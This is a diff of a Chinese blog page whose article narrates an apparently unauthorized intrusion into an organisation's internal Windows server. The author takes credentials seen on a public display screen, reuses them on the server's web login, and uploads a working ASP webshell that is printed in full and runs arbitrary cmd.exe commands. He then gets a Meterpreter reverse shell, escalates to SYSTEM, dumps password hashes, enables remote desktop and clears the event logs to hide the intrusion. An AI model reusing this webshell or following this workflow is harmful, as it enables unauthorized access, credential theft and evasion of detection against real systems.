@@ -562,14 +562,14 @@
             <div id="articleContent">
                 <p>声明：本文仅供技术研究交流之用，请遵守当地相关法律法规！</p>
 <p>声明2：本人作为一个菜鸟级脚本小子姿势水平有限，难免会出现疏漏和错误，我还得再学习一个</p>
-<p><img src="https://s3.ax1x.com/2020/11/14/DCfRat.jpg" alt=""></p>
+<p><img src="https://s3.ax1x.com/2020/11/14/DCfRat.jpg"></p>
 <h2 id="0x01：起因"><a href="#0x01：起因" class="headerlink" title="0x01：起因"></a>0x01：起因</h2><p>我偶然在[数据删除]发现了一个出故障的信息发布大屏，系统是win7，正在运行一个cmd窗口，命令是登录一个地址为192.168.██.███的ftp服务器。cmd里的ftp登录指令账户和密码居然是没有加密的，于是通过此渠道获得了账户和密码，分别为gjzx和███2013<br><img src="https://s3.ax1x.com/2020/11/14/DCXtp9.jpg" alt="如图"></p>
 <p>试着在自己电脑上登录了一下，成功，不过很可惜没什么有意思的东西<br><img src="https://s3.ax1x.com/2020/11/14/DCvjFU.png" alt="ftp服务器"></p>
 <h2 id="0x02：初步信息收集"><a href="#0x02：初步信息收集" class="headerlink" title="0x02：初步信息收集"></a>0x02：初步信息收集</h2><p>既然偶然收集到了密码，用户名和IP地址，那下一步自然是对靶机进行信息搜集了。直接开kali上nmap</p>
 <p>nmap扫描指定IP的所有信息：</p>
 <p><code>nmap -A 192.168.██.███</code></p>
 <p>nmap扫描结果：<br><img src="https://s3.ax1x.com/2020/11/14/DCzicj.png" alt="nmap扫描结果"><br>服务器开放了445，80，21，135等端口，系统大概率可能为Windows Server 2012 R2</p>
-<p>既然服务器开放了80端口，说明它可以用web浏览器访问，于是尝试了一下访问，结果发现需要密码和用户名，尝试了gjzx和███2013，居然成功登录。。。这个管理员属实鬼才，把两个端口的密码和用户名设成同一个。。。<br><img src="https://s3.ax1x.com/2020/11/14/DCzjxJ.png" alt="这个服务器的web界面"><br>这个界面展示的就是刚刚ftp服务器里的那几张图片，事情变得有意思了起来。于是右键，显示图片地址，发现图片地址为192.168.██.███/xin██████/███.jpg，不就是ftp根目录么！</p>
+<p>既然服务器开放了80端口，说明它可以用web浏览器访问，于是尝试了一下访问，结果发现需要密码和用户名，尝试了gjzx和███2013，居然成功登录。。。这个管理员属实鬼才，把两个端口的密码和用户名设成同一个。。。<br><img src="https://s3.ax1x.com/2020/11/14/DCzjxJ.png" alt="这个服务器的web界面"><br>这个界面展示的就是刚刚ftp服务器里的那几张图片，事情变得有意思了起来。于是右键，显示图片地址，发现图片地址为192.168.██.███&#x2F;xin██████&#x2F;███.jpg，不就是ftp根目录么！</p>
 <h2 id="0x03：获取webshell"><a href="#0x03：获取webshell" class="headerlink" title="0x03：获取webshell"></a>0x03：获取webshell</h2><p>有ftp了，有网络权限了，那肯定得用大名鼎鼎的文件上传漏洞了，先试试上传php版的一句话木马到ftp，输入地址栏，访问，结果提示我500服务器错误，看来php马被服务器过滤掉了。</p>
 <p>再试试asp版的一句话小马，上传，进web页面访问。。。成功拿到webshell！<br>我用的asp一句话小马：</p>
 <pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span>
@@ -579,7 +579,8 @@
 &lt;%=server.createobject("wsc"+"ript.shell").exec("cmd.exe /c "&amp;request("c")).stdout.readall%>
 
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
+</code></pre>
 <p>webshell界面：<br><img src="https://s3.ax1x.com/2020/11/14/DPpN1e.png" alt="webshell"></p>
 <h2 id="0x04：进阶信息收集"><a href="#0x04：进阶信息收集" class="headerlink" title="0x04：进阶信息收集"></a>0x04：进阶信息收集</h2><p>拿到webshell先看看进程列表<br><code>tasklist</code>：<br><img src="https://s3.ax1x.com/2020/11/14/DP9VHI.png" alt="进程列表"><br>看了下，这个服务器并没有运行任何安全软件，管理员工资-1000</p>
 <p>查看用户<br><code>net user</code>：<br><img src="https://s3.ax1x.com/2020/11/14/DP9sbR.png" alt="查看用户"><br>嗯，一个gjzx（我们现在正在用的账户），一个管理员Administrator和一个被关闭的Guest</p>
@@ -623,7 +624,8 @@ response.write(file)
 %>
 
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
+</code></pre>
 <h2 id="0x05：利用msf进行渗透并拿到meterpreter控制台"><a href="#0x05：利用msf进行渗透并拿到meterpreter控制台" class="headerlink" title="0x05：利用msf进行渗透并拿到meterpreter控制台"></a>0x05：利用msf进行渗透并拿到meterpreter控制台</h2><p>上一步中收集到的关键信息如下：</p>
 <ul>
 <li><p>网站的根目录：D:\web</p>
@@ -661,7 +663,8 @@ response.write(err.number)
 %>
 
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
+</code></pre>
 <p>于是进入kali，打开msfconsole，根据靶机系统生成合适的meterpreter木马，这里我选择的是针对64位Windows的反弹TCP端口木马。由于靶机没有装任何杀软，所以不用做免杀处理，舒坦。然后上传到ftp服务器目录里，再利用asp把meterpreter木马拷到D:\下，再进入webshell执行木马，连接成功！</p>
 <p><img src="https://s3.ax1x.com/2020/11/14/DPA7ZQ.png" alt="生成meterpreter木马并开始本地监听"></p>
 <p>不过中间有个小插曲就是第一次连接发现虽然系统已经显示建立了session1但是meterpreter控制台却迟迟没弹出来，原因就是因为必须要把meterpreter的payload和本地的payload设定为同种，否则就会出现这种情况。<br><img src="https://s3.ax1x.com/2020/11/14/DPZCCR.png" alt="成功得到靶机的meterpreter控制台"><br>输入getuid发现gjzx这个账户权限并不是管理员，且getsystem也不能用，因此需要提权</p>
@@ -669,33 +672,33 @@ response.write(err.number)
 <p>于是控制台输入<br><code>search local/ms</code><br><img src="https://s3.ax1x.com/2020/11/14/DPe3WR.png" alt="可用的payload"></p>
 <p>因为靶机只装了15年以前的补丁，所以选择其中一个比较新的尝试了一下<br><img src="https://s3.ax1x.com/2020/11/14/DPeHXV.png" alt="提权成功"><br>成功提权到SYSTEM，并且成功将gjzx权限提到管理员级别，然后就可以随便搞事了</p>
 <h2 id="0x07：尝试获取其他账户hash密码和明文密码"><a href="#0x07：尝试获取其他账户hash密码和明文密码" class="headerlink" title="0x07：尝试获取其他账户hash密码和明文密码"></a>0x07：尝试获取其他账户hash密码和明文密码</h2><p>试了下跑明文密码结果失败了，hash值倒是出来了，但必须得用字典跑<br><img src="https://s3.ax1x.com/2020/11/14/DPmUcq.png" alt="用kiwi跑明文和hash"></p>
-<h2 id="0x08：远程桌面登录"><a href="#0x08：远程桌面登录" class="headerlink" title="0x08：远程桌面登录"></a>0x08：远程桌面登录</h2><p>在06提权以后再<br><code>run getgui –e</code><br>开启远程桌面服务以后就可以直接进行远程桌面了，不过我又遇到了一个小插曲，就是我试图连接远程桌面时它提示我CreedSSP加密数据库修正，结果连接失败，网上搜了一下，最后根据<a href="https://www.cnblogs.com/jinanxiaolaohu/p/13111721.html" target="_blank" rel="noopener">这个教程</a>成功以gjzx的身份进入了靶机的远程桌面<br><img src="https://s3.ax1x.com/2020/11/14/DPnErV.png" alt=""></p>
+<h2 id="0x08：远程桌面登录"><a href="#0x08：远程桌面登录" class="headerlink" title="0x08：远程桌面登录"></a>0x08：远程桌面登录</h2><p>在06提权以后再<br><code>run getgui –e</code><br>开启远程桌面服务以后就可以直接进行远程桌面了，不过我又遇到了一个小插曲，就是我试图连接远程桌面时它提示我CreedSSP加密数据库修正，结果连接失败，网上搜了一下，最后根据<a target="_blank" rel="noopener" href="https://www.cnblogs.com/jinanxiaolaohu/p/13111721.html">这个教程</a>成功以gjzx的身份进入了靶机的远程桌面<br><img src="https://s3.ax1x.com/2020/11/14/DPnErV.png"></p>
 <h2 id="0x09：后续工作"><a href="#0x09：后续工作" class="headerlink" title="0x09：后续工作"></a>0x09：后续工作</h2><p>完成以后不能被别人发现踪迹，运行<br><code>clearev</code><br>清理掉痕迹就可以收工了<br><img src="https://s3.ax1x.com/2020/11/14/DPnNIe.png" alt="藏好自己，做好清理"></p>
 <h2 id="0x0A：总结"><a href="#0x0A：总结" class="headerlink" title="0x0A：总结"></a>0x0A：总结</h2><p>别因为不方便就彻底关掉Windows更新和Windows Defender，UAC千万不要轻易关掉，勒索病毒之所以一堆单位和高校中招还不是因为安全意识不高，装完系统就关Windows Defender和Windows更新或者万年不更新补丁，病毒不勒索你才怪。还有，Windows安全性实在是太低了，如果从事的工作涉及到国家或者商业秘密的话还是用Linux当主力靠谱</p>
 <h2 id="0x0B：参考资料"><a href="#0x0B：参考资料" class="headerlink" title="0x0B：参考资料"></a>0x0B：参考资料</h2><ul>
-<li><a href="https://cloud.tencent.com/developer/article/1472206" target="_blank" rel="noopener">MSF命令大全1</a></li>
-<li><a href="https://cloud.tencent.com/developer/article/1472205" target="_blank" rel="noopener">MSF命令大全2</a></li>
-<li><a href="https://cloud.tencent.com/developer/article/1472202" target="_blank" rel="noopener">MSF命令大全3</a></li>
-<li><a href="https://www.cnblogs.com/jinanxiaolaohu/p/13111721.html" target="_blank" rel="noopener">Windows远程时提示CredSSP加密数据库修正问题的简单处理</a></li>
-<li><a href="https://xz.aliyun.com/t/8091" target="_blank" rel="noopener">Windows系统提权webshell信息收集指令</a></li>
-<li><a href="https://misakikata.github.io/2019/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">文件上传漏洞</a></li>
-<li><a href="https://blog.csdn.net/qq284489030/article/details/90031998" target="_blank" rel="noopener">作为内网杀手的metasploit如何在外网使用呢？</a></li>
-<li><a href="https://m.freebuf.com/sectool/118714.html" target="_blank" rel="noopener">Meterpreter免杀技巧分享</a></li>
-<li><a href="https://www.cnblogs.com/backlion/p/9484949.html" target="_blank" rel="noopener">Meterpreter命令详解</a></li>
-<li><a href="https://blog.csdn.net/weixin_39997829/article/details/83656134" target="_blank" rel="noopener">msf拿到windows的shell显示乱码解决方法</a></li>
-<li><a href="https://www.pa55w0rd.online/msfvenom%20_use/" target="_blank" rel="noopener">msfvenom使用</a></li>
-<li><a href="https://blog.csdn.net/whatday/article/details/82904623" target="_blank" rel="noopener">metasploit msfvenom使用实例</a></li>
-<li><a href="https://m.freebuf.com/sectool/154752.htm" target="_blank" rel="noopener">手把手教你如何利用Meterpreter渗透Windows系统</a></li>
-<li><a href="https://cjjkkk.github.io/meterpreter-UACgetSystem/" target="_blank" rel="noopener">Metasploit生成木马文件获取shell和UAC提权操作</a></li>
-<li><a href="https://blog.csdn.net/l1028386804/article/details/86008037" target="_blank" rel="noopener">渗透之——MSF—Meterpreter清理日志</a></li>
-<li><a href="https://zhuanlan.zhihu.com/p/34085550" target="_blank" rel="noopener">Win提权思路，方法，工具（小总结）</a></li>
-<li><a href="https://www.geek-share.com/detail/2780656824.html" target="_blank" rel="noopener">vbs 复制指定文件到指定目录下</a></li>
-<li><a href="https://www.cnblogs.com/lhws/p/4024208.html" target="_blank" rel="noopener">net user命令集合详解</a></li>
-<li><a href="https://yinwc.github.io/2019/11/20/%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">提权笔记</a></li>
-<li><a href="https://www.webshell.cc/2366.html" target="_blank" rel="noopener">号称“最全的WEBSHELL提权大大全</a></li>
-<li><a href="https://xz.aliyun.com/t/8091" target="_blank" rel="noopener">提权学习之旅——Windows操作系统提权</a></li>
-<li><a href="https://blog.csdn.net/qq_38626043/article/details/109388147" target="_blank" rel="noopener">Metasploit-进阶用户密码与mimikatz模块kiwi模块</a></li>
-<li><a href="https://myt0.com/2019/03/03/windows%E5%90%8E%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">windows后渗透利用</a><br><img src="https://s3.ax1x.com/2020/11/14/DPnzsx.jpg" alt=""><br>搞事成功，玩CSGO去了（逃</li>
+<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1472206">MSF命令大全1</a></li>
+<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1472205">MSF命令大全2</a></li>
+<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1472202">MSF命令大全3</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/jinanxiaolaohu/p/13111721.html">Windows远程时提示CredSSP加密数据库修正问题的简单处理</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8091">Windows系统提权webshell信息收集指令</a></li>
+<li><a target="_blank" rel="noopener" href="https://misakikata.github.io/2019/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">文件上传漏洞</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq284489030/article/details/90031998">作为内网杀手的metasploit如何在外网使用呢？</a></li>
+<li><a target="_blank" rel="noopener" href="https://m.freebuf.com/sectool/118714.html">Meterpreter免杀技巧分享</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/9484949.html">Meterpreter命令详解</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39997829/article/details/83656134">msf拿到windows的shell显示乱码解决方法</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.pa55w0rd.online/msfvenom%20_use/">msfvenom使用</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/whatday/article/details/82904623">metasploit msfvenom使用实例</a></li>
+<li><a target="_blank" rel="noopener" href="https://m.freebuf.com/sectool/154752.htm">手把手教你如何利用Meterpreter渗透Windows系统</a></li>
+<li><a target="_blank" rel="noopener" href="https://cjjkkk.github.io/meterpreter-UACgetSystem/">Metasploit生成木马文件获取shell和UAC提权操作</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/l1028386804/article/details/86008037">渗透之——MSF—Meterpreter清理日志</a></li>
+<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/34085550">Win提权思路，方法，工具（小总结）</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.geek-share.com/detail/2780656824.html">vbs 复制指定文件到指定目录下</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lhws/p/4024208.html">net user命令集合详解</a></li>
+<li><a target="_blank" rel="noopener" href="https://yinwc.github.io/2019/11/20/%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/">提权笔记</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.webshell.cc/2366.html">号称“最全的WEBSHELL提权大大全</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8091">提权学习之旅——Windows操作系统提权</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38626043/article/details/109388147">Metasploit-进阶用户密码与mimikatz模块kiwi模块</a></li>
+<li><a target="_blank" rel="noopener" href="https://myt0.com/2019/03/03/windows%E5%90%8E%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/">windows后渗透利用</a><br><img src="https://s3.ax1x.com/2020/11/14/DPnzsx.jpg"><br>搞事成功，玩CSGO去了（逃</li>
 </ul>
 
             </div>
@@ -1250,6 +1253,10 @@ response.write(err.number)
                 
                 <div class="card-action article-tags">
                     
+                    <a href="/tags/Linux/">
+                        <span class="chip bg-color">Linux</span>
+                    </a>
+                    
                     <a href="/tags/Android/">
                         <span class="chip bg-color">Android</span>
                     </a>
@@ -1260,10 +1267,6 @@ response.write(err.number)
                     
                     <a href="/tags/%E4%B8%8B%E8%BD%BD%E5%99%A8/">
                         <span class="chip bg-color">下载器</span>
-                    </a>
-                    
-                    <a href="/tags/Linux/">
-                        <span class="chip bg-color">Linux</span>
                     </a>
                     
                     <a href="/tags/%E6%B5%81%E5%AA%92%E4%BD%93%E4%B8%8B%E8%BD%BD/">
@@ -1328,12 +1331,12 @@ document.createElement()
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%89%8D%E7%AB%AF/">
-                        <span class="chip bg-color">前端</span>
-                    </a>
-                    
                     <a href="/tags/%E7%BC%96%E7%A8%8B/">
                         <span class="chip bg-color">编程</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%89%8D%E7%AB%AF/">
+                        <span class="chip bg-color">前端</span>
                     </a>
                     
                     <a href="/tags/JavaScript/">
